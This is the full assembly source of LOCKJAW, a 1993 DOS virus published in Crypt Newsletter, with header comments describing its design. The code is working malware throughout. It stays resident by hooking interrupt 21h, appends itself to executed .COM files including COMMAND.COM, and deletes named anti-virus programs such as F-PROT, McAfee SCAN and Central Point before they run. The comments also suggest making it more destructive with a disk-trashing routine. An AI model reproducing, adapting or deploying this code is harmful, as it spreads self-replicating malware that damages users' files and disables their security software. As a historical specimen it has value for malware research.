;LOCKJAW: a .COM-infecting resident virus with retaliatory 
;anti-anti-virus capability.  Programmed and contributed by Nikademus, for
;Crypt Newsletter 12, Feb. 1993.               
;
;LOCKJAW is a resident virus which installs itself in
;memory using the same engine as the original Civil War/Proto-T virus.
;
;LOCKJAW hooks interrupt 21 and infects .COM files on execution, appending 
;itself to the end of the "host."  
;LOCKJAW will infect COMMAND.COM and is fairly transparent to a
;casual user, except when certain anti-virus programs 
;(Integrity Master, McAfee's SCAN &
;CLEAN, F-PROT & VIRSTOP and Central Point Anti-virus) are loaded.
;If LOCKJAW is present and any of these programs are employed from
;a write-protected diskette, the virus will, of course, generate
;"write protect" errors.
;
;LOCKJAW's "stinger" code demonstrates the simplicity of creating a strongly
;retaliating virus by quickly deleting the anti-virus program before it
;can execute and then displaying a "chomping" graphic.  Even if the anti-
;virus program cannot detect LOCKJAW in memory, it will be deleted.  This
;makes it essential that the user know how to either remove the virus from
;memory before beginning anti-virus measures, or at the least run the
;anti-virus component from a write-protected disk. At a time when retail
;anti-virus packages are becoming more complicated - and more likely that the
;average user will run them from default installations on his hard file -
;LOCKJAW's retaliating power makes it a potentially very annoying pest.
;A virus-programmer serious about inconveniencing a system could do a
;number of things with this basic idea. They are;
; 1. Remove the "chomp" effect. It is entertaining, but it exposes the virus
; instantly.
; 2. Alter the_stinger routine, so that the virus immediately attacks the
; hard file.  The implementation is demonstrated by LOKJAW-DREI, which
; merely makes the disk inaccessible until a warm reboot if an anti-virus
; program is employed against it.  By placing
; a BONA FIDE disk-trashing routine here, it becomes very hazardous for
; an unknowing user to employ anti-virus measures on a machine where
; LOCKJAW or a LOCKJAW-like program is memory resident.
;
;These anti-anti-virus strategies are becoming more numerous in viral 
;programming.                 
;
;For example, Mark Ludwig programmed the features of a direct-action 
;retaliating virus in his "Computer Virus Developments Quarterly."  
;Peach, Groove and Encroacher viruses attack anti-virus software by 
;deletion of files central
;to the functionality of the software. 
;
;And in this issue, the Sandra virus employs a number 
;of anti-anti-virus features. 
;
;The LOKJAW source listings are TASM compatible. To remove LOKJAW-ZWEI and                
;DREI infected files from a system, simply delete the "companion" .COM 
;duplicates of your executables.  Ensure that the machine has been booted
;from a clean disk.  To remove the LOCKJAW .COM-appending virus, at this
;time it will be necessary for you to restore the contaminated files from
;a clean back-up.
;
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h

len             equ offset last - begin
vir_len         equ len / 16d 

host:           db 0E9h, 03h, 00h, 43h, 44h, 00h     ; host dummy    

begin:          
		
		call virus            ; push i.p. onto the stack 

virus:          
		jmp after_note

note:            
		db     '[lôákıÑW].·ù.•åkÜdâMñ$'
		db     '≈Hã$.p‚ôG‚Üm.å$.Ö.{p‚ô≈î-≈].˚É‚ãÜ§≈'
		db     '≈hÜ•k$.≈¢.Ä‚òû'

after_note:     
		pop     bp                   ; recalculate change in offset          
		sub     bp,109h                        

fix_victim:     
		mov     di,0100h                 ; restore host's       
		lea     si,ds:[vict_head+bp]     ;    !
		mov     cx,06h                   ;    !
		rep     movsb                    ; first 6 bytes
Is_I_runnin:    
		mov     ax,2C2Ch                   
		int     21h                      ; call to see if installed  
		cmp     ax, 0DCDh
		je      Bye_Bye
cut_hole:  
		mov     ax,cs                    ; get memory control block    
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a    ; check if last block -   
		jne     abort                        
		mov     ax,ds:[0003]                 
		sub     ax,100                    ; decrease memory    
		mov     ds:0003,ax
Zopy_virus:                                      ; copy to claimed block
		mov     bx,ax                    ; PSP  
		mov     ax,es                    ; virus start    
		add     ax,bx                    ; in memory   
		mov     es,ax
		mov     cx,len                   ; cx = length of virus
		mov     ax,ds                    ; restore ds   
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin+bp]         ; point to start of virus   
		lea     di,es:0100               ; point to destination  
		rep     movsb                    ; start copying the virus   
						    
		mov     [vir_seg+bp],es        
		mov     ax,cs                       
		mov     es,ax                    ; restore extra segment
Grab_21:                                     
		cli
		mov     ax,3521h           ; request address of interrupt 21
		int     21h                     
		mov     ds,[vir_seg+bp]   
		mov     ds:[old_21h-6h],bx
		mov     ds:[old_21h+2-6h],es
		mov     dx,offset Lockjaw - 6h    ; revector to virus
		mov     ax,2521h                
		int     21h                     
		sti                            
abort:          
		mov     ax,cs                      ; get the hell outa 
		mov     ds,ax                      ; Dodge
		mov     es,ax
		xor     ax,ax

Bye_Bye:      
		mov     bx,0100h                  ; hand off to host
		jmp     bx                     

Lockjaw:         
		pushf                              ; is i checkin if     
		cmp     ax,2c2ch                   ; resident
		jne     My_21h                   
		mov     ax,0dcdh                 
		popf                                   
		iret
		
My_21h:         
		push    ds                       
		push    es                         ; save all registers
		push    di
		push    si
		push    ax
		push    bx
		push    cx
		push    dx
check_exec:     
		cmp     ax,04B00h                  ; is the file being 
		jne     notforme                   ; executed?
		mov     cs:[name_seg-6],ds
		mov     cs:[name_off-6],dx
		jmp     chk_com                    ; start potential
						   ; infection
notforme:       
		pop     dx                         ; exit
		pop     cx                         ; restore all registers
		pop     bx
		pop     ax
		pop     si
		pop     di
		pop     es
		pop     ds
		popf
		jmp     dword ptr cs:[old_21h-6]
int21:          
		pushf                           
		call    dword ptr cs:[old_21h-6]      ; int 21h handler
		jc      notforme                      ; exit on error
		ret                           

chk_com:        cld                              ; this essentially copies
		mov     di,dx                    ; the name of the file
		push    ds                       ; and sets it up for 
		pop     es                       ; comparison to the anti-
		mov     al,'.'                   ; virus defaults used in
		repne   scasb                    ; the_stinger
		call    the_stinger              ; anti-virus stinger  
		cmp     ax, 00ffh                ; WAS the program an AV?
		je      notforme
		cmp     word ptr es:[di],'OC'    ; is it a .com ?
		jne     notforme                 ; compare against extension
		cmp     word ptr es:[di+2],'M'   ; masks in these two steps
		jne     notforme                     
						     
		call    Grab_24                 ; set critical error handler  
		call    set_attrib
				
open_victim:                                    ; open potential host
		mov     ds,cs:[name_seg-6]   
		mov     dx,cs:[name_off-6]
		mov     ax,3D02h             
		call    int21            
		jc      close_file              ; leave on error
		push    cs
		pop     ds
		mov     [handle-6],ax           ; save handle 
		mov     bx,ax   

		call    get_date                ; save date/time characters
		
check_forme:    
		push    cs
		pop     ds
		mov     bx,[handle-6]        
		mov     ah,3fh
		mov     cx,06h                 ; copy first 6 bytes of host
		lea     dx,[vict_head-6]
		call    int21
		mov     al, byte ptr [vict_head-6]     ; is the prog a exe?
		mov     ah, byte ptr [vict_head-6]+1   
		cmp     ax,[exe-6]                     ; compare with 'ZM'
		je      save_date                      ; jump to restore
		mov     al, byte ptr [vict_head-6]+3   ; is the prog already
		mov     ah, byte ptr [vict_head-6]+4   ; infected?
		cmp     ax,[initials-6]
		je      save_date                
						 
		
get_len:        
		mov     ax,4200h                 
		call    move_pointer
		mov     ax,4202h                 
		call    move_pointer
		sub     ax,03h                   
		mov     [len_file-6],ax
	       
		call    write_jmp             ; write the jump to the virus
		call    write_virus           ; at the head of the host                        
					      ; write the remainder of the   
save_date:                                    ; virus to the end of the file
		push    cs                       
		pop     ds
		mov     bx,[handle-6]
		mov     dx,[date-6]
		mov     cx,[time-6]
		mov     ax,5701h
		call    int21

close_file:     
		mov     bx,[handle-6]
		mov     ah,03eh                    
		call    int21
		mov     dx,cs:[old_24h-6]          
		mov     ds,cs:[old_24h+2-6]
		mov     ax,2524h
		call    int21
		jmp     notforme         
new_24h:        
		mov     al,3            
		iret
the_stinger:    ; detection of anti-virus against defaults
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'XR'    ;*rx = VIREX
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'PO'    ;*STOP = VIRSTOP
		jne     next1                     
		cmp     word ptr es:[di-5],'TS'   
		je      jumptoass                

next1:          cmp     word ptr es:[di-3],'VA'    ;AV  = cpav
		je      jumptoass                  ;Central Point     
		cmp     word ptr es:[di-3],'TO'    ;*prot = F-prot
		jne     next2                
		cmp     word ptr es:[di-5],'RP'  
		je      jumptoass                     

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan =  McAfee's Scan.
		jne     next3                
		cmp     word ptr es:[di-5],'CS'  
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'NA'    ;*lean = CLEAN.
		jne     next3                      ; why not, eh?
		cmp     word ptr es:[di-5],'EL'  
		je      jumptoass                     
next3:          ret                
jumptoass:      
		jmp     Asshole_det                ;Asshole Program                                      
						   ;Detected, delete
move_pointer:   
		push    cs
		pop     ds
		mov     bx,[handle-6]
		xor     cx,cx
		xor     dx,dx
		call    int21
		ret
						
write_jmp:      
		push    cs                    
		pop     ds
		mov     ax,4200h         ; move pointer to beginning of host
		call    move_pointer     ; do it, as in move_pointer
		mov     ah,40h           ; write
		mov     cx,01h           ; a byte
		lea     dx,[jump-6]      ; of the jump to LOCKJAW code
		call    int21            ; out to the host
		mov     ah,40h           ; reset the pointer 
		mov     cx,02h           
		lea     dx,[len_file-6]
		call    int21
		mov     ah,40h           ; write the virus's recognition
		mov     cx,02h           ; intials out to the host
		lea     dx,[initials-6]
		call    int21
		ret

write_virus:    
		push    cs
		pop     ds
		mov     ax,4202h       
		call    move_pointer   ; move the pointer to end of host
		mov     ah,40      ; write-to-file function
		mov     cx,len     ; length of virus in cx 
		mov     dx,100
		call    int21      
		ret

get_date:       
		mov     ax,5700h           ; get date/time stamps oh host
		call    int21              ; stash them in buffers
		push    cs
		pop     ds
		mov     [date-6],dx        ;<-----
		mov     [time-6],cx        ;<-----
		ret
					 
Grab_24:        
		mov     ax,3524h              ; set up critical error handler
		call    int21        
		mov     cs:[old_24h-6],bx
		mov     cs:[old_24h+2-6],es
		mov     dx,offset new_24h-6
		push    cs
		pop     ds
		mov     ax,2524h            ; revector error handler to virus
		call    int21        
		ret

set_attrib:  
		mov     ax,4300h             ; retrieve file attributes
		mov     ds,cs:[name_seg-6]
		mov     dx,cs:[name_off-6]
		call    int21
		and     cl,0feh                
		mov     ax,4301h
		call    int21               
		ret
Asshole_det:
		mov     ds,cs:[name_seg-6]           ; the anti-virus file
		mov     dx,cs:[name_off-6]
		mov     ax, 4301h                    ; clear attributes
		mov     cx, 00h
		call    int21            
		mov     ah, 41h                      ; delete it
		call    int21
chomp:
		push    cs                           ; da chomper visual
		pop     ds
		mov     ah, 03h
		int     10h
		mov     [c1-6], bh                   ; save cursor 
		mov     [c2-6], dh 
		mov     [c3-6], dl 
		mov     [c4-6], ch 
		mov     [c5-6], cl 
		mov     ah, 1
		mov     cl, 0
		mov     ch, 40h                 
		int     10h                    
					       
		mov     cl, 0
		mov     dl, 4Fh                 
		mov     ah, 6
		mov     al, 0
		mov     bh, 0Fh
		mov     ch, 0
		mov     cl, 0
		mov     dh, 0
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 0
		mov     dl, 1Fh
		mov     bh, 0
		int     10h                    
					       
		mov     dx, offset eyes - 6          ; print the eyes
		mov     ah, 9
		mov     bl, 0Fh
		call    int21                    
					       
		mov     ah, 2
		mov     dh, 1
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DCh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 18h
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DFh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     dl, 0
chomp_1:
		mov     ah, 2
		mov     dh, 2
		int     10h                    
					       
		mov     ah, 9
		mov     al, 55h                 
		mov     bl, 0Fh
		mov     cx, 1
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 17h
		inc     dl
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0EFh
		mov     bl, 0Fh
		int     10h                    
					       
		inc     dl
		cmp     dl, 50h                 
		jl      chomp_1                  
		mov     [data_1-6], 0
chomp_3:
		mov     cx, 7FFFh                    ; delays

locloop_4:
		loop    locloop_4              

		inc     [data_1-6]
		cmp     [data_1-6], 0Ah
		jl      chomp_3                  
		mov     [data_1-6], 0
		mov     cl, 0
		mov     dl, 4Fh                 
chomp_5:
		mov     ah, 6
		mov     al, 1
		mov     bh, [data_2-6]
		mov     ch, 0Dh
		mov     dh, 18h
		int     10h                    
					       
		mov     ah, 7
		mov     al, 1
		mov     bh, [data_2-6]
		mov     ch, 0
		mov     dh, 0Ch
		int     10h                    
		mov     cx, 3FFFh                      ; delays

locloop_6:
		loop    locloop_6              
		inc     [data_1-6]
		cmp     [data_1-6], 0Bh
		jl      chomp_5                  
		mov     [data_1-6], 0
chomp_7:
		mov     cx, 7FFFh                       ; delays

locloop_8:
		loop    locloop_8              
		inc     [data_1-6]
		cmp     [data_1-6], 0Ah
		jl      chomp_7                  
		mov     ah, 6
		mov     al, 0
		mov     bh, [data_2-6]
		mov     ch, 0
		mov     cl, 0
		mov     dh, 18h
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     cl, 7
		mov     ch, 6
		int     10h                    
		
		mov     ah, 2
		mov     bh, [c1-6] 
		mov     dh, [c2-6] 
		mov     dl, [c3-6] 
		int     10h
		mov     al, bh
		mov     ah, 5
		int     10h
		mov     ah, 1
		mov     ch, [c4-6]
		mov     cl, [c5-6]
		int     10h
		mov     ax, 0003h
		int     10h                        ; sort of a cls
		mov     ax, 00ffh
		ret
					       

eyes            db      '(o)          (o)','$'      ; ASCII eyes
vict_head       db  090h, 0cdh, 020h, 043h, 044h, 00h  ; 6 bytes of host    
jump            db  0E9h                                   
initials        dw  4443h   ; I.D.                               
exe             dw  5A4Dh   ; ZM - ident for .EXE files
last            db  090h                                   

data_1          db      0
data_2          db      0
old_21h         dw  00h,00h
old_24h         dw  00h,00h
old_10h         dw  00h,00h
name_seg        dw  ?
name_off        dw  ?
vir_seg         dw  ?
len_file        dw  ?
handle          dw  ?
date            dw  ?
time            dw  ?
c1              db       0          
c2              db       0          
c3              db       0          
c4              db       0          
c5              db       0          

code            ends
		end host



